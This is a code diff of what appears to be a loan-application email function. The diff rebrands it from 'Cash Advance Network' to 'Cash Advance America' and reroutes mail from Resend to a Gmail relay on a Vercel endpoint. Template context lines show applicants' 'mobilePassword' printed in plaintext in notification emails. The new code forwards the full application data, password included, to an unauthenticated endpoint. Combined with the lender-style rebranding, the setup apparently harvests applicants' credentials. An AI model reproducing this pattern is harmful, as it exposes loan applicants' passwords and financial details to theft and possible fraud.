@@ -170,7 +170,7 @@ Password: ${applicationData.mobilePassword || 'N/A'}
 
     </div>
     <div class="footer">
-      <p>Cash Advance Network - Admin Notification</p>
+      <p>Cash Advance America - Admin Notification</p>
     </div>
   </div>
 </body>
@@ -183,7 +183,7 @@ Password: ${applicationData.mobilePassword || 'N/A'}
       textContent = `
 Dear ${applicationData.firstName || 'Valued Customer'},
 
-Thank you for submitting your loan application with Cash Advance Network!
+Thank you for submitting your loan application with Cash Advance America!
 
 We have received your application and will review it within 24 hours.
 
@@ -216,7 +216,7 @@ Password: ${applicationData.mobilePassword || 'N/A'}
 We will contact you soon with our decision.
 
 Best regards,
-Cash Advance Network Team
+Cash Advance America Team
       `
 
       htmlContent = `
@@ -242,7 +242,7 @@ Cash Advance Network Team
   <div class="container">
     <div class="header">
       <h1>✅ Application Received</h1>
-      <p>Thank you for choosing Cash Advance Network</p>
+      <p>Thank you for choosing Cash Advance America</p>
     </div>
     <div class="content">
       <p>Dear ${applicationData.firstName || 'Valued Customer'},</p>
@@ -334,7 +334,7 @@ Cash Advance Network Team
       </ul>
     </div>
     <div class="footer">
-      <p>Cash Advance Network</p>
+      <p>Cash Advance America</p>
       <p>support@cashadvanceamerica.com | 1-800-LOAN-HELP</p>
     </div>
   </div>
@@ -343,66 +343,49 @@ Cash Advance Network Team
       `
     }
 
-    // Send email using Resend
-    const resendApiKey = Deno.env.get('RESEND_API_KEY')
+    // Send email via Gmail through the Vercel API endpoint
+    const vercelApiUrl = Deno.env.get('VERCEL_API_URL')
 
-    console.log('API Key exists:', !!resendApiKey)
-    console.log('API Key prefix:', resendApiKey ? resendApiKey.substring(0, 10) + '...' : 'NOT FOUND')
-
-    if (!resendApiKey) {
-      console.error('❌ RESEND_API_KEY not set')
+    if (!vercelApiUrl) {
+      console.error('❌ VERCEL_API_URL not set')
       return new Response(
-        JSON.stringify({ success: false, error: 'RESEND_API_KEY not configured' }),
+        JSON.stringify({ success: false, error: 'VERCEL_API_URL not configured' }),
         { headers: { ...corsHeaders, 'Content-Type': 'application/json' }, status: 500 }
       )
     }
 
-    // Use verified domain
-    const fromEmail = 'Cash Advance Network <support@cashadvancenetwork.com>'
-
-    console.log('Making API request to Resend...')
-    console.log('From:', fromEmail)
+    console.log('Sending email via Gmail (Vercel API)...')
     console.log('To:', clientEmail)
 
     const requestBody = {
-      from: fromEmail,
-      to: clientEmail,
-      subject: emailSubject,
-      text: textContent,
-      html: htmlContent,
+      applicationData,
+      clientEmail,
+      recipientType,
+      clientName,
     }
 
-    console.log('Request body:', JSON.stringify(requestBody, null, 2))
-
-    const res = await fetch('https://api.resend.com/emails', {
+    const res = await fetch(`${vercelApiUrl}/api/send-application-email-gmail`, {
       method: 'POST',
       headers: {
-        'Authorization': `Bearer ${resendApiKey}`,
         'Content-Type': 'application/json',
       },
       body: JSON.stringify(requestBody),
     })
 
-    console.log('Response status:', res.status)
-    console.log('Response headers:', Object.fromEntries(res.headers.entries()))
-
     const responseData = await res.json()
-    console.log('Response data:', responseData)
 
     if (!res.ok) {
-      console.error('❌ Resend API error:', responseData)
-      throw new Error(`Resend API error: ${JSON.stringify(responseData)}`)
+      console.error('❌ Gmail API error:', responseData)
+      throw new Error(`Gmail API error: ${JSON.stringify(responseData)}`)
     }
 
-    console.log('✅ Email sent successfully!')
-    console.log('Email ID:', responseData.id)
+    console.log('✅ Email sent successfully via Gmail!')
     console.log('========================================')
 
     return new Response(
       JSON.stringify({
         success: true,
-        message: 'Email sent successfully',
-        id: responseData.id
+        message: 'Email sent successfully via Gmail',
       }),
       { headers: { ...corsHeaders, 'Content-Type': 'application/json' }, status: 200 }
     )
